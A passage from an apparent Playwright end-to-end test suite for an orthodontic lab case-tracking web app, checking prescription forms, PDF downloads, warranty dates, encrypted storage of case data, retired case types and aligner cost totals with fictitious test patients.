  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('secret-ret-note-7731') && !dump.includes('specialty-retainer') && !dump.includes('Hawleywick') && !dump.includes('adams'), 'the Retainer Rx is stored encrypted with the case');
  await openByName(gwen, 'Hazel Hawleywick'); await gwen.waitForSelector('#drawer [data-ds=rxRet]', { timeout: 20000 });
  check(/Hawley \(upper\)/.test(await gwen.textContent('#drawer [data-ds=rxRet] .dsS')) && /\$88\.50/.test(await gwen.textContent('#drawer [data-ds=rxRet]')), 'Gwen sees the Retainer Rx and its estimate');
  const [retDl] = await Promise.all([gwen.waitForEvent('download'), gwen.click('#drawer [data-ds=rxRet] .pickRow [data-act=rxPdf]')]);
  const retPdf = fs.readFileSync(await retDl.path()).toString('latin1');
  check(retDl.suggestedFilename().startsWith('Retainer Rx - Hazel Hawleywick - ') && retPdf.startsWith('%PDF-') && retPdf.includes('(TEST-4471)') && retPdf.includes('(Hazel Hawleywick)') && retPdf.includes('(Teal)'), 'Gwen downloads Specialty’s Retainer Rx filled in (account #, patient, acrylic color)');
  await gwen.click('#drawer [data-ds=rxRet] [data-act=rxEdit]'); await gwen.waitForSelector('#rxWrap');
  check(!(await gwen.$('#rxWrap [data-rxa=saveDef]')), 'staff have no “Save as our usual retainer”');
  await gwen.click('#rxWrap .rxFold[data-fold=flr] .rxFoldB'); // (folded: the Rx has no bonded retainer yet)
  await gwen.click('#rxWrap .rxB[data-rxg=flrL][data-v=c3]'); await gwen.click('#rxWrap [data-rxa=done]');
  await owner.waitForFunction(() => { const c = openCases().find(x => x.patient === 'Hazel Hawleywick'); return !!(c && c.rxRet && c.rxRet.flrL === 'c3'); }, null, { timeout: 20000 });
  check(true, 'Gwen’s lower bonded retainer reaches Dr. A live');
  // Specialty's warranty (Amir, 4 Oct 2026): once the case ships, its remake deadlines; the invoice date and No Guarantee are
  // saved with the case, encrypted
  check(!(await gwen.isVisible('#drawer [data-ds=wty]')), 'no Specialty warranty before the case ships');
  await gwen.click('#drawer [data-act=setStage][data-k=shipped]');
  const fitBy = await gwen.evaluate(() => wtyDay(addDays(todayISO(), 30)));
  await gwen.waitForFunction(t => ((document.querySelector('#dsS-wty') || {}).textContent || '').startsWith('Fit remake free until about ' + t + ' · defects until about'), fitBy, { timeout: 20000 });
  check(/the dates are estimates, counted from the day it moved to Shipped/.test(await gwen.textContent('#wtyBox')), 'moved to Shipped: Specialty’s warranty shows (a free fit remake for 30 days, defects for 6 months), estimated from the day it shipped');
  const invD = await gwen.evaluate(() => addDays(todayISO(), -45)), halfBy = await gwen.evaluate(d => wtyDay(addDays(d, 60)), invD);
  await gwen.fill('#wtyBox [data-wty=inv]', invD); await gwen.press('#wtyBox [data-wty=inv]', 'Enter');
  await gwen.waitForFunction(t => ((document.querySelector('#dsS-wty') || {}).textContent || '').startsWith('Fit remake half price until ' + t), halfBy, { timeout: 20000 });
  await owner.waitForFunction(d => { const c = openCases().find(x => x.patient === 'Hazel Hawleywick'); return !!(c && c.invDate === d && c.stage === 'shipped'); }, invD, { timeout: 20000 });
  check(true, 'Gwen enters Specialty’s invoice date (45 days ago): fit remakes are half price now, and it reaches Dr. A live');
  await gwen.check('#wtyBox [data-wty=ng]');
  await gwen.waitForFunction(() => /No Guarantee case: no warranty/.test((document.querySelector('#dsS-wty') || {}).textContent || ''), null, { timeout: 20000 });
  await owner.waitForFunction(() => { const c = openCases().find(x => x.patient === 'Hazel Hawleywick'); return !!(c && c.noGuarantee === true); }, null, { timeout: 20000 });
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('invDate') && !dump.includes(invD) && !dump.includes('noGuarantee'), 'marked No Guarantee (no warranty); the invoice date and the mark are stored encrypted with the case');
  await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Metal Rx for Specialty (Amir, 4 Oct 2026: "Next lets use this"): an RPE in New case, stored encrypted, the PDF for staff');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]'); await owner.fill('#cf-patient', 'Rory Rapidwick');
  await tapAppl('Rapid Palatal Expander (RPE)');
  check(await owner.isVisible('#cf-rxMetSec') && await labNow() === 'Specialty Orthodontic Lab' && !(await owner.isVisible('#cf-rxHint')) && !(await owner.isVisible('#cf-rxSec')) && !(await owner.isVisible('#cf-rxRetSec')),
    'RPE → Specialty: the Metal Rx shows right away (not the Herbst or Retainer Rx)');
  await owner.fill('#cf-deliveryDate', await owner.evaluate(() => addDays(todayISO(), 30)));
  await owner.click('#ncForm [data-rxform=edit][data-kind=met]'); await owner.waitForSelector('#rxWrap .rxArch.live');
  await owner.fill('#rxWrap [data-rxf=notes]', 'secret-met-note-6613');
  check(/\$185\.00/.test(await owner.textContent('#rxTot')), 'estimate: Hyrax $109 + 2 × 3D printed bands $38 = $185.00 (our expanders start 3D printed)');
  await owner.click('#rxWrap [data-rxa=done]'); await owner.waitForSelector('#rxWrap', { state: 'detached' });
  check(/Hyrax RPE · 2 bands \(3D printed\)/.test(await owner.textContent('#cf-rxMetSum')), 'the New case form shows the Metal Rx’s summary');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('secret-met-note-6613') && !dump.includes('specialty-metal') && !dump.includes('Rapidwick') && !dump.includes('hyrax') && !dump.includes('printed3d'), 'the Metal Rx is stored encrypted with the case');
  await openByName(gwen, 'Rory Rapidwick'); await gwen.waitForSelector('#drawer [data-ds=rxMet]', { timeout: 20000 });
  check(/Hyrax RPE/.test(await gwen.textContent('#drawer [data-ds=rxMet] .dsS')) && /\$185\.00/.test(await gwen.textContent('#drawer [data-ds=rxMet]')), 'Gwen sees the Metal Rx and its estimate');
  const [metDl] = await Promise.all([gwen.waitForEvent('download'), gwen.click('#drawer [data-ds=rxMet] .pickRow [data-act=rxPdf]')]);
  const metPdf = fs.readFileSync(await metDl.path()).toString('latin1');
  check(metDl.suggestedFilename().startsWith('Metal Rx - Rory Rapidwick - ') && metPdf.startsWith('%PDF-') && metPdf.includes('(TEST-4471)') && metPdf.includes('(Rory Rapidwick)'), 'Gwen downloads Specialty’s Metal Rx filled in (account #, patient)');
  await gwen.click('#drawer [data-ds=rxMet] [data-act=rxEdit]'); await gwen.waitForSelector('#rxWrap');
  check(!(await gwen.$('#rxWrap [data-rxa=saveDef]')), 'staff have no “Save as our usual RPE”');
  await gwen.click('#rxWrap .rxFold[data-fold=acc] .rxFoldB'); // (folded: no accessories yet)
  await gwen.click('#rxWrap .rxB[data-rxg=awt][data-v=U]'); await gwen.click('#rxWrap [data-rxa=done]');
  await owner.waitForFunction(() => { const c = openCases().find(x => x.patient === 'Rory Rapidwick'); return !!(c && c.rxMet && (c.rxMet.awt || []).includes('U')); }, null, { timeout: 20000 });
  check(true, 'Gwen’s archwire tubes reach Dr. A live');
  await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Functional Rx for Specialty (Amir, 4 Oct 2026: the lower Schwarz goes to Specialty): New case, stored encrypted, the PDF for staff');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=appliance]'); await owner.fill('#cf-patient', 'Sasha Schwarzberg');
  await tapAppl('Schwartz'); await owner.click('#ncForm .pickRow[data-g=acrylic] .pick[data-v=Pink]');
  check(await owner.isVisible('#cf-rxFunSec') && await labNow() === 'Specialty Orthodontic Lab' && !(await owner.isVisible('#cf-rxRetSec')) && !(await owner.isVisible('#cf-rxSec')) && !(await owner.isVisible('#cf-rxMetSec')),
    'Schwarz → Specialty: the Functional Rx shows (not the Herbst, Retainer or Metal Rx)');
  await owner.fill('#cf-deliveryDate', await owner.evaluate(() => addDays(todayISO(), 30)));
  await owner.click('#ncForm [data-rxform=edit][data-kind=fun]'); await owner.waitForSelector('#rxWrap .rxArch.live');
  check(await owner.evaluate(() => RXE.rx.actL === 'schwarz' && RXE.rx.exp === 'mid' && Object.entries(RXE.rx.teeth).sort().join() === 'LL4,ball,LL6,delta,LR4,ball,LR6,delta'), 'it starts as Dr. A’s lower Schwarz (midline screw, delta clasps on the 6s, ball clasps behind the Ds)');
  await owner.fill('#rxWrap [data-rxf=notes]', 'secret-fun-note-3319');
  await owner.click('#rxWrap [data-rxa=done]'); await owner.waitForSelector('#rxWrap', { state: 'detached' });
  check(/Schwarz – Transverse \(lower\)/.test(await owner.textContent('#cf-rxFunSum')), 'the New case form shows the Functional Rx’s summary');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('secret-fun-note-3319') && !dump.includes('specialty-functional') && !dump.includes('Schwarzberg'), 'the Functional Rx is stored encrypted with the case');
  await openByName(gwen, 'Sasha Schwarzberg'); await gwen.waitForSelector('#drawer [data-ds=rxFun]', { timeout: 20000 });
  check(/Schwarz – Transverse \(lower\)/.test(await gwen.textContent('#drawer [data-ds=rxFun] .dsS')), 'Gwen sees the Functional Rx');
  const [funDl] = await Promise.all([gwen.waitForEvent('download'), gwen.click('#drawer [data-ds=rxFun] .pickRow [data-act=rxPdf]')]);
  const funPdf = fs.readFileSync(await funDl.path()).toString('latin1');
  check(funDl.suggestedFilename().startsWith('Functional Rx - Sasha Schwarzberg - ') && funPdf.startsWith('%PDF-') && funPdf.includes('(TEST-4471)') && funPdf.includes('(Sasha Schwarzberg)') && funPdf.includes('(Pink)'), 'Gwen downloads Specialty’s Functional Rx filled in (account #, patient, acrylic color)');
  await gwen.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# InSmile: digital enhancements instead of refinements');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=insmile]'); await owner.fill('#cf-patient', 'Ines Smilewright');
  check(await owner.isVisible('.pickRow[data-g=initialDE]') && !(await owner.isVisible('.pickRow[data-g=initial]')), 'asks Initial / DE 1 / DE 2 / DE 3 instead of refinement');
  check(!(await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Aligners are not tracking well"]')) && await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Resolve black triangles"]') && await owner.isVisible('.pickRow[data-g=goal_ob]') && !(await owner.isVisible('.pickRow[data-g=goal_ap]')) && !(await owner.isVisible('.pickRow[data-g=instrPicks] .pick[data-v="Active retention"]')), 'aligner-only pictures (incl. Active retention) hidden for InSmile; Overbite and the rest stay (no AP row since 3 Oct 2026)');
  check(!(await owner.isVisible('#cf-tc')), 'no aligner tooth chart for braces');
  await owner.click('.pickRow[data-g=initialDE] .pick[data-v=de2]');
  check(await owner.inputValue('#cf-detail') === 'InSmile braces – DE2', 'detail reads InSmile braces – DE2');
  check(await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'InSmile assigned to whoever creates it');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Ines Smilewright');
  check(await owner.isVisible('#drawer .badge:has-text("Digital enhancement 2 (DE2)")') && !(await owner.isVisible('#drawer .badge:has-text("Refinement")')), 'case shows Digital enhancement 2 (DE2)');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .pickRow[data-g=initialDE] .pick[data-v=de2]', 'aria-pressed')) === 'true', 'editing keeps DE 2');
  // braces on one arch only (Amir, 2 Oct 2026: not always both arches)
  check((await owner.getAttribute('#drawer .pickRow[data-g=treatArch] .pick[data-v=UL]', 'aria-pressed')) === 'true', 'Arches to treat: Upper & lower to start');
  await owner.click('#drawer .pickRow[data-g=treatArch] .pick[data-v=L]');
  check(await owner.inputValue('#drawer #cf-detail') === 'InSmile braces (lower only) – DE2', 'Lower only: the detail follows the taps (InSmile braces (lower only) – DE2)');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .badge.t-arch', { timeout: 20000 });
  check(/Lower arch only/.test(await owner.textContent('#drawer .badge.t-arch')) && /for InSmile braces - digital enhancement 2, lower arch only\./.test(await owner.textContent('#noteTxt')), 'saved: Lower arch only on the case and in its chart note');
  dump = JSON.stringify(await fsDump());
  check(!dump.includes('lower only') && !dump.includes('Lower arch'), 'the arch choice is encrypted too');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# InBrace/Brava retired; InSmile stays');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  check((await owner.locator('#ncForm .tt[data-tile=inbrace]').count()) === 0 && await owner.isVisible('#ncForm .tt[data-tile=insmile]'), 'New case has no InBrace/Brava button; InSmile is still there');
  await owner.click('.modal [data-act=closeModal]');
  await owner.click('#nav-list'); await owner.fill('#q', '');
  check((await owner.locator('select[data-f=type] option[value=inbrace]').count()) === 0, 'the type filter doesn’t offer InBrace when no case uses it');
  // an older InBrace case (say, imported from Asana) still opens and edits
  await owner.evaluate(() => B.createCase({ type: 'inbrace', patient: 'Leona Legacycase', stage: 'dra', detail: 'InBrace IDB', comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await openByName(owner, 'Leona Legacycase');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .tt[data-tile=inbrace]', 'aria-checked')) === 'true' && (await owner.locator('#drawer .tt[data-tile]').count()) === (await owner.evaluate(() => TILES.filter(t => !t.legacy).length + 1)), 'an older InBrace case still edits as InBrace');
  await owner.fill('#drawer #cf-notes', 'legacy-edit-ok');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
  check(await owner.isVisible('#drawer .dHd .badge:has-text("InBrace")') && await owner.isVisible('#drawer .txt:has-text("legacy-edit-ok")'), 'saving keeps it InBrace with the change');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  check((await owner.locator('select[data-f=type] option[value=inbrace]').count()) === 1, 'the filter offers InBrace while such a case is open');

  console.log('\n# Next Level Express retired');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=oliv]');
  check(await owner.isVisible('.pickRow[data-g=extras] .pick:has-text("No elastics")') && (await owner.locator('.pickRow[data-g=extras] .pick:has-text("Next Level Express")').count()) === 0, 'New case has no Next Level Express button');
  await owner.click('.modal [data-act=closeModal]');
  await owner.evaluate(() => B.createCase({ type: 'oliv', patient: 'Nora Expressold', stage: 'submit', extras: ['Next Level Express (5 aligners or less)'], comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await openByName(owner, 'Nora Expressold');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .pickRow[data-g=extras] .pick:has-text("Next Level Express")', 'aria-pressed')) === 'true', 'an older case keeps its Next Level Express choice when edited');
  await owner.fill('#drawer #cf-notes', 'express-edit-ok');
  await owner.click('[data-act=saveEdit]'); await owner.waitForSelector('#drawer .stepper', { timeout: 20000 });
  check(await owner.isVisible('#drawer .badge:has-text("Next Level Express")') && await owner.isVisible('#drawer .txt:has-text("express-edit-ok")'), 'saving the edit doesn’t drop it');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# Case types: company logos and pictures; Retreatment retired; Study models; retainers in 2 office days');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  const shown = await owner.locator('#ncForm .tt[data-tile]').evaluateAll(els => els.map(e => e.dataset.tile));
  check(!shown.includes('retreat') && !shown.includes('misc') && shown.includes('models'), 'no Retreatment or Dr. A (misc.) button; Study models is there');
  check(!/Dr\. A \(misc|Retreatment/.test(await owner.textContent('#ncForm .tileGrid')), 'the old names are gone from New case');
  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#ncForm .tt[data-tile]')).every(b => b.querySelector('.tmed img[src^="data:image/"], .tmed svg.tsvg'))), 'every case type has a logo or a picture');
  // Appliance and MARPE: the pictures Dr. A chose (the whole upper arch with the appliance; Amir, 2 Oct 2026)
  check(await owner.evaluate(() => ['appliance', 'marpe'].every(v => { const i = document.querySelector('#ncForm .tt[data-tile=' + v + '] .tmed.pic img'); return i && i.complete && i.naturalWidth > 0; })), 'Appliance and MARPE show Dr. A’s pictures');
  // (LOGOS.nlo is the office's own logo, shown for in-house sets in the lists and on the board; the In-house tile keeps the NL mark)
  check(await owner.evaluate(() => Object.keys(LOGOS).filter(k => k !== 'nlo' && !k.startsWith('lab-') && !k.startsWith('arch-')).every(k => document.querySelector('#ncForm .tt[data-tile=' + k + '] .tmed.lg img'))), 'companies show their own logos (' + (await owner.evaluate(() => Object.keys(LOGOS).filter(k => k !== 'nlo' && !k.startsWith('lab-') && !k.startsWith('arch-')).join(', '))) + ')');
  check(await owner.evaluate(() => Array.from(document.querySelectorAll('#ncForm .tmed.lg img')).every(i => i.complete && i.naturalWidth > 0)), 'the logos load under the page’s security policy');
  check(await owner.isVisible('#ncForm .tt[data-tile=nla] .nlf'), 'In-house shows the NL mark');
  await owner.click('#ncForm .tt[data-tile=retainer]');
  await owner.fill('#cf-scanDate', '2026-10-07'); // a Wednesday
  check(await owner.inputValue('#cf-deliveryDate') === '2026-10-12' && await owner.inputValue('#cf-labDate') === '', 'retainers scanned on a Wednesday are delivered Monday (2 office days, Mon–Thu)');
  await owner.fill('#cf-scanDate', '2026-11-24'); // Tuesday of Thanksgiving week
  check(await owner.inputValue('#cf-deliveryDate') === '2026-12-01', 'office holidays are skipped (Thanksgiving week → Tuesday Dec 1)');
  await owner.click('#ncForm .tt[data-tile=models]'); await owner.fill('#cf-patient', 'Mona Modelson');
  check(await owner.inputValue('#cf-detail') === 'Study models' && await owner.inputValue('#cf-assignee') === await owner.evaluate(() => meSid()), 'Study models: filled in and assigned to whoever creates it');
  check(await owner.isVisible('.pickRow[data-g=scanner]') && !(await owner.isVisible('.pickRow[data-g=initial]')) && !(await owner.isVisible('.goalGrid')), 'asks for the scanner, not aligner questions');
  check(await owner.inputValue('#cf-deliveryDate') === '', 'no retainer dates carried over to study models');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-board'); await owner.fill('#q', '');
  check((await owner.locator('[data-act=flow][data-k=retreat]').count()) === 0 && (await owner.locator('[data-act=flow][data-k=misc]').count()) === 0, 'no Retreatment or misc tab on the board');
  await owner.click('[data-act=flow][data-k=models]');
  await owner.waitForSelector('section[aria-label="To print"] .kc:has-text("Mona Modelson")', { timeout: 20000 });
  check(true, 'lands on the Study models board at To print');
  await owner.evaluate(() => B.createCase({ type: 'retreat', patient: 'Rhea Retreatold', stage: 'review', detail: 'Relapse', comments: [], createdAt: Date.now(), createdBy: meSid() }));
  await owner.waitForSelector('[data-act=flow][data-k=retreat]', { timeout: 20000 });
  check(true, 'an older Retreatment case still gets its board tab');
  await openByName(owner, 'Rhea Retreatold');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer .cf');
  check((await owner.getAttribute('#drawer .tt[data-tile=retreat]', 'aria-checked')) === 'true', 'and it still edits as Retreatment');
  await owner.click('#drawer [data-act=cancelEdit]'); await owner.click('#drawer [data-act=closeDrawer] >> nth=0');

  console.log('\n# No due date; in-house fabrication steps; progress marks; aligner totals per patient');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  check((await owner.locator('#cf-dueDate').count()) === 0 && await owner.isVisible('#cf-scanDate') && await owner.isVisible('#cf-labDate') && await owner.isVisible('#cf-deliveryDate'), 'dates are scan, lab completion and delivery — no due date');
  await owner.click('#ncForm .tt[data-tile=nla]'); await owner.fill('#cf-patient', 'Nadia Setcount'); await owner.fill('#cf-chart', '77-1234');
  await owner.click('.pickRow[data-g=initial] .pick[data-v=yes]'); await owner.fill('#cf-alU', '20'); await owner.fill('#cf-alL', '20');
  check(/40 aligners in this set/.test(await owner.textContent('#cf-alTotal')), 'aligners, not stages: upper 20 + lower 20 = 40 in this set');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await openByName(owner, 'Nadia Setcount');
  check((await owner.locator('#drawer .stepGrp:has-text("In fabrication")').count()) === 1 && (await owner.locator('#drawer .step.sub').count()) === 7, 'the stepper shows the seven fabrication steps under In fabrication');
  // TxP approved (3 Oct 2026): the plan is done and the counts go in, even if the export waits
  await owner.click('#drawer .step[data-k=txpok]'); await owner.waitForSelector('#gAl', { timeout: 10000 });
  check(await owner.textContent('#modalWrap h3') === 'TxP approved' && await owner.inputValue('#gAlU') === '20' && await owner.inputValue('#gAlL') === '20' && await owner.isDisabled('#gGo'), 'TxP approved asks for the aligners (filled in: U 20 · L 20) and waits for the attachment-template answer');
  await owner.click('.pickRow[data-g=gAt] .pick[data-v=UL]'); await owner.click('#gGo');
  await owner.waitForSelector('#drawer .step.cur[data-k=txpok]', { timeout: 15000 });
  check(await owner.evaluate(() => { const c = findCase(S.openId); return c.stage === 'txpok' && c.atTemplates === 'UL' && c.aligners === 40; }), 'saved at TxP approved with the counts and the template answer (before any export)');
  await owner.click('#drawer .step[data-k=fab]'); await owner.waitForSelector('#drawer .step.cur[data-k=fab]', { timeout: 15000 });
  check(!(await owner.isVisible('#modalWrap')), 'TxP approved → Export STLs doesn’t ask again');
  check(/Attachment templates: Upper & Lower/.test(await owner.textContent('#alBox')), 'the answer is saved with the move (Attachment templates: Upper & Lower)');
  check(/40 aligners in this set \(U 20 · L 20\)/.test(await owner.textContent('#alBox')) && /Patient total: 40 aligners/.test(await owner.textContent('#alBox')), 'the case shows its 40 aligners (U 20 · L 20) and the patient total');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0');
  await owner.click('#nav-board'); await owner.fill('#q', ''); await owner.click('[data-act=flow][data-k=inhouse]');
  const nCard = 'section[aria-label="In fabrication"] .kc:has-text("Nadia Setcount")';
  await owner.waitForSelector(nCard + ' .kstep:has-text("Export STLs")', { timeout: 15000 }).catch(e => boardDiag(owner, 'Nadia Setcount', e));
  check(/1 of 7/.test(await owner.textContent(nCard + ' .kstep')), 'board: one In fabrication column; the card shows Export STLs, 1 of 7');
  await owner.click(nCard + ' .adv'); await owner.waitForSelector(nCard + ' .kstep:has-text("Send to printer")', { timeout: 15000 });
  check(/2 of 7/.test(await owner.textContent(nCard + ' .kstep')) && (await owner.locator(nCard + ' .sprog i.d').count()) === 1, 'the arrow moves it one step (Send to printer, 2 of 7)');
  await owner.click('#nav-list'); await owner.fill('#q', 'Nadia Setcount');
  const nRow = 'tr.click:has-text("Nadia Setcount")'; await owner.waitForSelector(nRow + ' .sprog');
  check((await owner.locator(nRow + ' .sprog i').count()) === 11 && (await owner.locator(nRow + ' .sprog .pg i').count()) === 7 && (await owner.locator(nRow + ' .sprog i.d').count()) === 3 && (await owner.locator(nRow + ' .sprog i.c').count()) === 1
    && (await owner.locator(nRow + ' .sprog b').count()) === 10 && (await owner.locator(nRow + ' .sprog b.d').count()) === 3, 'list: a circle for every step joined by a line (3 done — TxP needed, TxP approved, Export STLs — now on step 4 of 11, the line filled up to it)');
  check(/Send to printer · in fabrication 2\/7/.test(await owner.textContent(nRow + ' td.stg')), 'list: says Send to printer, in fabrication 2/7');
  await owner.click(nRow); await owner.waitForSelector('#drawer .stepper');
  await owner.click('#drawer .dFt [data-act=complete]'); await owner.waitForSelector('#drawer', { state: 'hidden', timeout: 15000 }).catch(() => {});
  await sleep(800);
  await owner.click('#nav-admin');
  // (a rare flake here — the cost not saved within 15 s, seen twice on 3 Oct: watch whether the box was redrawn under the typing)
  await owner.evaluate(() => { window.__alPerSwaps = 0; const v = document.querySelector('#view'); new MutationObserver(ms => { if (ms.some(m => Array.from(m.removedNodes).some(n => n.nodeType === 1 && (n.id === 'alPer' || n.querySelector('#alPer'))))) window.__alPerSwaps++; }).observe(v, { childList: true, subtree: true }); });
  await owner.fill('#alPer', '4.5'); await owner.press('#alPer', 'Tab');
  let costOk = await owner.waitForFunction(() => S.settings.alPerAligner === 4.5, null, { timeout: 15000 }).then(() => true, () => false); // (a "Saved" toast could be an older one)
  if (!costOk) {
    console.log('   (cost not saved after 15 s: ' + JSON.stringify(await owner.evaluate(() => ({ swaps: window.__alPerSwaps, val: (document.querySelector('#alPer') || {}).value, def: (document.querySelector('#alPer') || {}).defaultValue, ae: document.activeElement && (document.activeElement.id || document.activeElement.tagName), settings: S.settings, toasts: Array.from(document.querySelectorAll('.toast')).map(t => t.textContent) }))) + ' — typing it once more)');
    await owner.fill('#alPer', '4.5'); await owner.press('#alPer', 'Tab');
    costOk = await owner.waitForFunction(() => S.settings.alPerAligner === 4.5, null, { timeout: 15000 }).then(() => true, () => false);
  }
  check(costOk, 'Dr. A sets the cost per aligner in Team & security');
  await owner.click('.topBar [data-act=newCase]'); await owner.waitForSelector('#ncForm');
  await owner.click('#ncForm .tt[data-tile=nla]'); await owner.fill('#cf-patient', 'Nadia Setcount'); await owner.fill('#cf-chart', '77-1234');
  await owner.click('.pickRow[data-g=initial] .pick[data-v=no]'); await owner.fill('#cf-alU', '12'); await owner.fill('#cf-alL', '10');
  await owner.waitForSelector('#cf-alTotal:has-text("Patient total: 62 aligners")', { timeout: 20000 });
  check(await owner.isVisible('#cf-alTotal .alSet:has-text("Initial 40")') && await owner.isVisible('#cf-alTotal .alSet.me:has-text("Refinement 1 22")'), 'New case adds the earlier set: Initial 40 + Refinement 1 22 = 62 aligners');
  await owner.waitForSelector('#cf-alTotal:has-text("est. $99.00")', { timeout: 15000 }).catch(() => {}); // the new cost reaches the form with the settings update
  check(/est\. \$99\.00/.test(await owner.textContent('#cf-alTotal')) && /est\. \$279\.00/.test(await owner.textContent('#cf-alTotal')), 'estimated cost: this set 22 × $4.50 = $99.00; patient 62 × $4.50 = $279.00');
  await owner.click('#ncSave'); await owner.waitForSelector('#modalWrap', { state: 'detached', timeout: 20000 });
  await owner.click('#nav-list'); await owner.fill('#q', 'Nadia Setcount'); await owner.waitForSelector('tr.click:has-text("Nadia Setcount") .alMini:has-text("62 total")', { timeout: 20000 });
  check(/22 aligners/.test(await owner.textContent('tr.click:has-text("Nadia Setcount") .alMini')), 'list: 22 aligners · 62 total');
  await owner.click('tr.click:has-text("Nadia Setcount")'); await owner.waitForSelector('#alBox'); await owner.waitForSelector('#alBox:has-text("est. $99.00")', { timeout: 15000 }).catch(() => {});
  check(/Patient total: 62 aligners/.test(await owner.textContent('#alBox')) && /Refinement 1/.test(await owner.textContent('#alBox')) && /est\. \$99\.00/.test(await owner.textContent('#alBox')), 'the refinement case shows its estimated cost and the patient’s total');
  await owner.click('#drawer [data-act=closeDrawer] >> nth=0'); await owner.fill('#q', '');
  check(await owner.evaluate(() => {
    const S = (n, c) => ({ name: n, completed: c });
    const a = stageFromSection('nla', 'In Fabrication', [S('Exported STLs U1-3', true), S('Sent to printer ', true), S('Printing COMPLETED ', false), S('Thermoforming', false), S('Trimming ', false), S('Polished ', false), S('Final Wash and Dry', false)]);
    const b = stageFromSection('nla', 'In Fabrication', [S('Exported STLs', true), S('Sent to printer', true), S('Printing COMPLETED', true), S('Thermoforming', true), S('Trimming', true), S('Polished', true), S('Final Wash and Dry', false)]);
    const c = stageFromSection('nla', 'In Fabrication', null);
    const rows = asanaRowsFromCSV('Task ID,Name,Section/Column,Projects,Completed At,Parent task\n1,"Test Case - Aligners (In-House)",In Fabrication,NL Lab,,\n2,Exported STLs,,,2026-10-01,"Test Case - Aligners (In-House)"\n3,Sent to printer,,,,"Test Case - Aligners (In-House)"');
    return a === 'print' && b === 'wash' && c === 'fab' && rows.length === 1 && caseFromAsana(rows[0], 'NL Lab', []).stage === 'send';
  }), 'Asana import: the NL Lab checklist (subtasks) picks the fabrication step, from the API or a CSV');

  console.log('\n# In-house treatment: Start and Expected removal, and the graph of where the patient is');
  const txS = await owner.evaluate(() => addDays(todayISO(), -60)), txE = await owner.evaluate(() => addDays(todayISO(), 300));
  await openByName(owner, 'Nadia Setcount'); // the refinement (the initial set is complete); the patient has no dates yet
  check(await owner.textContent('#dsS-tx') === 'No start and expected removal yet', 'an in-house case without dates says so on its Treatment line');
  await owner.click('#drawer [data-act=edit]'); await owner.waitForSelector('#drawer #cf-txStart');
  check(await owner.isVisible('#drawer #cf-txStart') && await owner.isVisible('#drawer #cf-txEnd') && !(await owner.isVisible('#drawer #cf-txChange')), 'Edit asks for the Start and Expected removal (the patient has none yet)');
  await owner.fill('#drawer #cf-txStart', txS); await owner.fill('#drawer #cf-txEnd', txE);
  await owner.click('#drawer [data-act=saveEdit]'); await owner.waitForSelector('#drawer #dsS-tx:has-text("Month")', { state: 'attached', timeout: 15000 });
  const txLine = await owner.textContent('#dsS-tx');
  check(/^Month \d+ of 12 · 17% · /.test(txLine), 'saved: the Treatment line says where the patient is (' + txLine + ')');
  if (await owner.getAttribute('#drawer .ds[data-ds=tx] .dsTg', 'aria-expanded') !== 'true') await owner.click('#drawer .ds[data-ds=tx] .dsTg');
  const txEnds = await owner.$$eval('#drawer .txEnds span', ss => ss.map(x => x.textContent)), txFmt = await owner.evaluate(([a, b]) => [fmtDate(a), fmtDate(b)], [txS, txE]);
  check(await owner.isVisible('#drawer .txSvg.w') && (await owner.getAttribute('#drawer .txSvg.w', 'aria-label')).startsWith(txLine) && (await owner.locator('#drawer .txSvg.w .today').count()) === 1
